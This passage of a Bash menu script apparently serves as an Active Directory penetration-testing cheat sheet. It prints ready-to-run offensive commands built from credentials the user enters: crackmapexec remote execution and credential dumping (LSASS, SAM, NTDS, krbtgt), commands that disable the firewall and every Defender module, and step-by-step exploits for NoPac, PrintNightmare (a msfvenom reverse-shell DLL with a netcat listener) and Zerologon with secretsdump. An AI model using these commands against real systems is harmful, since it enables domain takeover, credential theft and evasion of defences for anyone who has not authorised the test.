echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "nmap --script=smb-enum-users,smb-enum-shares,smb-os-discovery -Pn -p 139,445 $IP"
echo -e ""
echo -e "${IBLUE}nmblookup${RESTORE}"
echo -e "nmblookup -A $IP"
echo -e ""
echo -e "${IBLUE}enum4linux${RESTORE}"
echo -e "enum4linux -u $Username -p $Password -r $IP -w $Domain| grep 'Local User'"
echo -e ""
echo -e "${IBLUE}SMBmap${RESTORE}"
echo -e "smbmap -H $IP -u $Username -p $Password -d $Domain"
echo -e "smbmap -H $IP -u $Username -p $Password -d $Domain -R"
echo -n -e "smbmap -H $IP -u $Username -p $Password -d $Domain -R -A .zip";echo -e " ${YELLOW}  # Pattern match, download files${RESTORE}"
echo -e ""
echo -e "${IBLUE}SMBclient${RESTORE}"
echo -e "smbclient -U $Username -P $Password -L \\\\\\\\\\\\\\\\$NQIP -W $Domain"
echo -e ""
echo -e "${IBLUE}Crackmapexec${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --computers"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --disks"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --groups"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --local-groups"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --loggedon-users"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --pass-pol"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --rid-brute"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --sessions"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --shares"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --users"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X whoami" ;echo -e " ${YELLOW}# PowerShell${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -x whoami" ;echo -e " ${YELLOW}# CMD${RESTORE}"
echo -e ""
echo -e "${IBLUE}Crackmapexec - GPO credentials${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M gpp_autologin"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M gpp_password"
echo -e ""
echo -e "${IBLUE}Crackmapexec - Extract Secrets${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --handlekatz"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --lsa"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --lsassy"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --nanodump"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --ntds vss"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --ntds"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --ntds --user krbtgt"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --ntds --enabled"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --procdump"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --sam"
echo -e ""
echo -e "${IBLUE}Crackmapexec - Vulnerability Scan${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M Zerologon"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M PetitPotam"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --handlekatz"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --handlekatz"
echo -e ""
echo -e "${IBLUE}Firewall${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -x 'netsh advfirewall set allprofiles state off'" ;echo -e " ${YELLOW}# Disable Firewall (CMD)${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'" ;echo -e " ${YELLOW}# Disable Firewall (PowerShell)${RESTORE}"
echo -e ""
echo -e "${IBLUE}Microsoft Defender${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X 'Get-MpComputerStatus | Select AntivirusEnabled'" ;echo -e " ${YELLOW}# Check if Defender is enabled${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X 'Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL'" ;echo -e " ${YELLOW}# Check Defensive Modules${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X 'Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL'" ;echo -e " ${YELLOW}# Check if tamper protection is enabled${RESTORE}"
echo -e ""
echo -e "${IBLUE}Turn off all Defender modules${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X 'Set-MpPreference -DisableRealtimeMonitoring \$true;Set-MpPreference -DisableIOAVProtection \$true;Set-MPPreference -DisableBehaviorMonitoring \$true;Set-MPPreference -DisableBlockAtFirstSeen \$true;Set-MPPreference -DisableEmailScanning \$true;Set-MPPReference -DisableScriptScanning \$true;Set-MpPreference -DisableIOAVProtection \$true'"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}


External_Menu_WinRM(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}WinRM${RESTORE}"
echo -e ""
echo -e "${IBLUE}Crackmapexec${RESTORE}"
echo -e "crackmapexec winrm $IP -u $Username -p $Password"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X whoami" ;echo -e " ${YELLOW}# PowerShell${RESTORE}"
echo -e ""
echo -e "${IBLUE}Evil-WinRM${RESTORE}"
echo -e "evil-winrm -i $IP -u $Username -p $Password"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}

External_Menu_CVEs(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Recent CVE's${RESTORE}"

echo -ne " What would you like to do?


	1)  ->  [ NoPac		  ]  ${LYELLOW}WIP${RESTORE}
	2)  -> 	[ Print Nightmare ]  ${LYELLOW}WIP${RESTORE}
	3)  ->	[ Zerologon	  ]  ${LYELLOW}WIP${RESTORE}
	
	Q)  ->	[Previous Menu	  ]

"
        read a
        case $a in
                1) 	External_Menu_CVEs_NoPac ;;
                2)	External_Menu_CVEs_PrintNightmare ;;
                3)	External_Menu_CVEs_Zerologon ;;
                q|Q)	External_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

External_Menu_CVEs_NoPac(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}NoPac Menu${RESTORE}"

echo -ne " What would you like to do?


	1)  ->  [ Check    	]
	2)  ->	[ Exploit  	]
	
	Q)  ->	[Previous Menu	]

"
        read a
        case $a in
                1) 	External_Menu_CVEs_NoPac_Check ;;
                2)	External_Menu_CVEs_NoPac_Exploit ;;
                q|Q) 	External_Menu_CVEs ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}

External_Menu_CVEs_NoPac_Check(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}NoPac Checks${RESTORE}"
echo -e ""
echo -e "${IBLUE}Crackmapexec${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}nopac${RESTORE}"
echo -e ""
echo -e "${IBLUE}Pachine${RESTORE}"
echo -e "python3 pachine.py -dc-host $NQIP -scan $NQDomain/$NQUsername:$Password"
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_CVEs_NoPac ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

External_Menu_CVEs_NoPac_Exploit(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}NoPac Exploits (Auto)${RESTORE}"
echo -e ""
echo -e "${IBLUE}sam-the-admin${RESTORE}"
echo -e "python3 sam_the_admin.py $NQDomain/$NQUsername:$Password -dc-ip $IP -shell"
echo -e ""
echo -e "${IBLUE}Pachine${RESTORE}"
echo -e "python3 pachine.py -dc-host $NQIP -spn cifs/$NQIP -impersonate administrator $NQDomain/$NQUsername:$Password"
echo -e ""
echo -e ""
echo -e "${PURPLE}Important:${RESTORE} Ensure computer accounts are cleaned up. Even failed attemps may produce computer accounts in the Domain"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_CVEs_NoPac ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

External_Menu_CVEs_PrintNightmare(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Print Nightmare Menu${RESTORE}"

echo -ne " What would you like to do?


	1)  ->  [ Check    	]
	2)  ->	[ Exploit  	]
	
	Q)  ->	[Previous Menu	]

"
        read a
        case $a in
                1) 	External_Menu_CVEs_PrintNightmare_Check ;;
                2)	External_Menu_CVEs_PrintNightmare_Exploit ;;
                q|Q) 	External_Menu_CVEs ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac


}

External_Menu_CVEs_PrintNightmare_Check(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Print Nightmare (Check)${RESTORE}"
echo -e ""
# Add install to script
echo -e "${IBLUE}PrintNightmareScanner${RESTORE}"
echo -e ""
echo -e "python3 detectprintnightmare.py -t [SingleIP]"
echo -e "python3 detectprintnightmare.py -T [TargetsFile.txt]"
echo -e "python3 detectprintnightmare.py -c [10.10.10.0/24]"
echo -e ""
echo -e "${IBLUE}rpcdump${RESTORE}"
echo -e "python3 rpcdump.py @$IP | egrep 'MS-RPRN|MS-PAR'"
echo -e ""
echo -e ""
echo -e ""
echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_CVEs_PrintNightmare ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac


}

External_Menu_CVEs_PrintNightmare_Exploit(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Print Nightmare (RCE) (Exploit)${RESTORE}"
echo -e ""
# Add install to script
echo -e "${IBLUE}#1: Configure smb.conf${RESTORE}"
echo -e ""
echo -e "Add the following to the end of /etc/samba/smb.conf"
echo -ne "

[smb]
    comment = Samba
    path = /tmp/share
    guest ok = yes
    read only = yes
    browsable = yes
    force user = nobody

"
echo -e "${IBLUE}#2: Start samba service and create directory for hosted DLL${RESTORE}"
echo -e "sudo apt install samba (install if not already)"
echo -e "sudo service smbd start"
echo -e "mkdir /tmp/share"
echo -e ""
echo -e "${IBLUE}#3: Build msfvenom payload and set up netcat ${RESTORE}"
echo -e "msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=8888 -f dll -o /tmp/share/rev.dll"
echo -e "nc -lvp 8888"
echo -e ""
echo -e "${IBLUE}#4: Exploit${RESTORE}"
echo -e "./printnightmare.py -dll '\\\\\\\\$LocalIP\\\\smb\\\\rev.dll' $Username:$Password@$IP"
echo -e "Exploit may appear to have failed. However a reverse shell should have been caught."
echo -e ""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_CVEs_PrintNightmare ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac


}

External_Menu_CVEs_Zerologon(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Zerologon Menu${RESTORE}"

echo -ne " What would you like to do?


	1)  ->  [ Check    	]
	2)  ->	[ Exploit  	]
	
	Q)  ->	[Previous Menu	]

"
        read a
        case $a in
                1) 	External_Menu_CVEs_Zerologon_Check ;;
                2)	External_Menu_CVEs_Zerologon_Exploit ;;
                q|Q) 	External_Menu_CVEs ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

External_Menu_CVEs_Zerologon_Check(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Zerologon (Check)${RESTORE}"
echo -e ""
# Add install to script
echo -e "${IBLUE}ZeroScan${RESTORE}"
echo -e "zeroscan.py -t [DC_NETBIOS_NAME] $IP"
echo -e ""
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_CVEs_Zerologon ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


External_Menu_CVEs_Zerologon_Exploit(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Zerologon (RCE) (Exploit)${RESTORE}"
echo -e ""
echo -e "${IBLUE}#1: Exploit the Domain Controller${RESTORE}"
# Add install to script
echo -e "python3 set_empty_pw.py [DC_NETBIOS_NAME] $IP"
echo -e ""
echo -e "${IBLUE}#2: DC sync with secretsdump.py${RESTORE}"
echo -e "secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 '$Domain/[DC_NETBIOS_NAME]@$IP'"
echo -e ""
echo -e ""
echo -e "${LYELLOW}Create section for DC restoration${RESTORE}"
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	External_Menu_CVEs_Zerologon ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac


}
External_Variables_Required(){

	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Required Variables${RESTORE}"
echo -e ""
read -p "Enter domain username: " UsernameRead
echo -e ""
echo -e ""
read -p "Enter domain user password " PasswordRead
echo -e ""
echo -e ""
read -p "Enter Domain Controller IP " IPRead
echo -e ""
echo -e ""
read -p "Enter Domain Name " DomainRead
echo -e ""
echo -e ""
echo -e ""
echo -e "The following variables have been set:"

echo -ne "

Username	:	$UsernameRead
Password	:	$PasswordRead
DC IP		:	$IPRead
Domain		:	$DomainRead



"

Declare_Variables(){

# Variables for commands with quotes

Username=\""$UsernameRead"\"
Password=\""$PasswordRead"\"
IP=\""$IPRead"\"
Domain=\""$DomainRead"\"

# Variables for command no quotes

NQUsername=$UsernameRead
NQDomain=$DomainRead
NQIP=$IPRead

}

Declare_Variables

echo -ne "
            Choose Option
            
       	1) -> External Commands
       	2) -> Set optional variables

        Q) -> Previous Menu
"
        read a
        case $a in
        	1)	External_Menu_Main ;;
        	2)	External_Variables_Optional ;;
	        q|Q) 	External_Menu_Options ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

External_Variables_Optional(){

	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Optional Variables${RESTORE}"
echo -e ""
read -p "Enter Base LDAP:        (DC=Security,DC=Local)" LDAPRead
echo -e ""
echo -e ""
read -p "Enter Nameserver IP " NSRead
echo -e ""
echo -e ""
echo -e ""
echo -e "The following variables have been set:"

echo -ne "

LDAP		:	$LDAPRead
NameServer	:	$NSRead



"
Declare_Variables_Optional(){

# Variables for commands with quotes

Username=\""$UsernameRead"\"
Password=\""$PasswordRead"\"

}

Declare_Variables_Optional

echo -ne "
            Choose Option
            
       	1) -> External Commands
       	2) -> Set Required Variables

        Q) -> Previous Menu
"
        read a
        case $a in
        	1)	External_Menu_Main ;;
        	2)	External_Variables_Required ;;
	        q|Q) 	External_Menu_Options ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

External_Menu_Options(){

	clear
	
echo -e ""
echo -e ""
echo -e ""

echo -ne "
	
	What would you like to do?

        1) -> Continue to external commands
        2) -> Set script variables (Required)
        3) -> Set script variables (Optional)
"
        read a
        case $a in
	        1) 	External_Menu_Main ;;
	        2) 	External_Variables_Required ;;
	        3)	External_Variables_Optional ;;	
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac


}


Main_Menu(){

    clear

echo -ne "
            Main Menu

        1) -> Internal
        2) -> External
"
        read a
        case $a in
	        1) Internal_Menu_Main ;;
	        2) External_Menu_Options ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}

# Call the menu function
Main_Menu
